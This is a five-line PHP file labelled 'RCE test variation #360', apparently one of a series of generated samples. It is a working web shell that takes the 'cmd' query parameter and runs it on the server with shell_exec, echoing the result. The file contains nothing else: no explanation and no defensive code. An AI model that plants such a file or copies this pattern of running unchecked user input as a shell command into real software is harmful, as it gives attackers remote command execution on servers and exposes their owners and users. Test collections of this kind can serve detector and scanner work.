<?php
// RCE test variation #360
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>